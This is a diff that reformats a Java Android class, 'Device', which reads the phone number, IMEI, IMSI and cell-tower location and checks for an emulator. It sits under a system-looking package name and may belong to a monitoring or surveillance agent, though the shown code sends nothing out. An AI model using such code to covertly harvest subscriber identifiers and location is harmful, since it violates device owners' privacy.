@@ -23,7 +23,7 @@ import com.android.service.util.Utils;
  */
 public class Device {
 	private static final String TAG = "Device";
-	
+
 	/** The singleton. */
 	private volatile static Device singleton;
 
@@ -53,16 +53,16 @@ public class Device {
 		TelephonyManager mTelephonyMgr;
 
 		mTelephonyMgr = (TelephonyManager) Status.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
-		
+
 		String number = mTelephonyMgr.getLine1Number();
-		
+
 		if (number == null || number.length() == 0) {
 			number = "Unknown";
 		}
-	
+
 		return number;
 	}
-	
+
 	/**
 	 * Gets the version.
 	 * 
@@ -70,40 +70,40 @@ public class Device {
 	 */
 	public byte[] getVersion() {
 		final byte[] versionRet = Utils.intToByteArray(Version.VERSION);
-		if(Cfg.DEBUG) Check.ensures(versionRet.length == 4, "Wrong version len");
+		if (Cfg.DEBUG) {
+			Check.ensures(versionRet.length == 4, "Wrong version len");
+		}
 		return versionRet;
 	}
 
 	/**
 	 * Checks if is CDMA.
-	 *
+	 * 
 	 * @return true, if is CDMA
 	 */
 	public static boolean isCdma() {
 		return false;
 	}
-	
+
 	public static boolean isGprs() {
 		return true;
 	}
-	
-	public boolean isSimulator(){
-		//return getDeviceId() == "9774d56d682e549c";
+
+	public boolean isSimulator() {
+		// return getDeviceId() == "9774d56d682e549c";
 		return android.os.Build.MODEL.endsWith("sdk");
 	}
 
 	/**
 	 * Gets the imei.
-	 *
+	 * 
 	 * @return the imei
 	 */
 	public String getImei() {
-		final TelephonyManager telephonyManager = (TelephonyManager) Status
-				.getAppContext().getSystemService(Context.TELEPHONY_SERVICE);
+		final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
+				Context.TELEPHONY_SERVICE);
 
 		String imei = telephonyManager.getDeviceId();
-		
-	
 
 		if (imei == null || imei.length() == 0) {
 			imei = Secure.getString(Status.getAppContext().getContentResolver(), Secure.ANDROID_ID);
@@ -117,69 +117,75 @@ public class Device {
 
 	/**
 	 * Gets the imsi.
-	 *
+	 * 
 	 * @return the imsi
 	 */
 	public String getImsi() {
-		final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext()
-			.getSystemService(Context.TELEPHONY_SERVICE);
-		
+		final TelephonyManager telephonyManager = (TelephonyManager) Status.getAppContext().getSystemService(
+				Context.TELEPHONY_SERVICE);
+
 		String imsi = telephonyManager.getSubscriberId();
-		
+
 		if (imsi == null) {
 			imsi = "UNAVAILABLE";
 		}
-		
+
 		return imsi;
 	}
-	
-	public static CellInfo getCellInfo(){
 
-		
-		android.content.res.Configuration conf = Status.getAppContext()
-				.getResources().getConfiguration();
-		TelephonyManager tm = (TelephonyManager) Status.getAppContext()
-				.getSystemService(Context.TELEPHONY_SERVICE);
-		
-		
-		CellInfo info = new CellInfo();
+	public static CellInfo getCellInfo() {
 
-		
-		CellLocation bcell = tm.getCellLocation();
+		final android.content.res.Configuration conf = Status.getAppContext().getResources().getConfiguration();
+		final TelephonyManager tm = (TelephonyManager) Status.getAppContext().getSystemService(
+				Context.TELEPHONY_SERVICE);
+
+		final CellInfo info = new CellInfo();
+
+		final CellLocation bcell = tm.getCellLocation();
 
 		if (bcell == null) {
-			if(Cfg.DEBUG) Check.log( TAG + " Error: " + "null cell");
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Error: " + "null cell");
+			}
 			return info;
 		}
 
-		int rssi = 0; //TODO aggiungere RSSI
-		
+		final int rssi = 0; // TODO aggiungere RSSI
+
 		if (bcell instanceof GsmCellLocation) {
-			if(Cfg.DEBUG) Check.asserts(Device.isGprs(), "gprs or not?");
-			GsmCellLocation cell = (GsmCellLocation) bcell;
-			
+			if (Cfg.DEBUG) {
+				Check.asserts(Device.isGprs(), "gprs or not?");
+			}
+			final GsmCellLocation cell = (GsmCellLocation) bcell;
+
 			info.setGsm(conf.mcc, conf.mnc, cell.getLac(), cell.getCid(), rssi);
 
-			if(Cfg.DEBUG) Check.log( TAG + " info: " + info.toString());
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " info: " + info.toString());
+			}
 
 		}
 
 		if (bcell instanceof CdmaCellLocation) {
-			if(Cfg.DEBUG) Check.asserts(Device.isCdma(), "cdma or not?");
-			CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();
-			
-			info.setCdma(cell.getSystemId(),cell.getNetworkId(), cell.getBaseStationId(), rssi);
+			if (Cfg.DEBUG) {
+				Check.asserts(Device.isCdma(), "cdma or not?");
+			}
+			final CdmaCellLocation cell = (CdmaCellLocation) tm.getCellLocation();
+
+			info.setCdma(cell.getSystemId(), cell.getNetworkId(), cell.getBaseStationId(), rssi);
 			info.cdma = true;
 			info.valid = true;
 
 			info.sid = cell.getSystemId();
-			info.nid  = cell.getNetworkId();
+			info.nid = cell.getNetworkId();
 			info.bid = cell.getBaseStationId();
-						
-			if(Cfg.DEBUG) Check.log( TAG + " info: " + info.toString());
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " info: " + info.toString());
+			}
 
 		}
-		
+
 		return info;
 	}
 
